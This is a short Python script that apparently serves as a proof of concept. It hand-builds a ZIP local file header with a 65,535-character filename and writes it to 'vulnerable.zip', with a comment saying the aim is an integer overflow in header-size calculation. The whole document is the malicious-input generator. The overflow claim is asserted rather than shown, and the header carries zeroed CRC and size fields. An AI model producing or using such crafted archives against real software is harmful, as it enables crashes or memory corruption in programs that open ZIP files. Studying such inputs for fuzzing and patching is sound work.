import zlib
import struct

def zipOpenNewFileInZip4_64(zipFile, filename, compress_type=zlib.DEFLATED, level=6, comment='', extra_field=b''):
    filename_encoded = filename.encode()
    comment_encoded = comment.encode()

    filename_len = len(filename_encoded)
    comment_len = len(comment_encoded)
    extra_field_len = len(extra_field)


    file_header = b""
    file_header += b"\x50\x4b\x03\x04"  # Local file header signature
    file_header += b"\x14\x00"        # Version needed to extract (minimum version 2.0)
    file_header += b"\x00\x00"        # General purpose bit flag
    file_header += struct.pack("<H", compress_type) # Compression method
    file_header += b"\x00\x00\x00\x00" # File last modification time and date
    file_header += b"\x00\x00\x00\x00" # CRC-32
    file_header += b"\x00\x00\x00\x00" # Compressed size
    file_header += b"\x00\x00\x00\x00" # Uncompressed size
    file_header += struct.pack("<H", filename_len) # Filename length
    file_header += struct.pack("<H", extra_field_len) # Extra field length
    
    zipFile.write(file_header)
    zipFile.write(filename_encoded)
    zipFile.write(extra_field)

    return zipFile

def create_vulnerable_zip(filename="vulnerable.zip"):
  with open(filename, "wb") as f:
    # Create a long filename to cause integer overflow when calculating total header size
    long_filename = "A" * 65535
    
    # Create a local file header with a long filename
    zipOpenNewFileInZip4_64(f, long_filename)


if __name__ == "__main__":
    create_vulnerable_zip()
    print("Vulnerable ZIP file created: vulnerable.zip")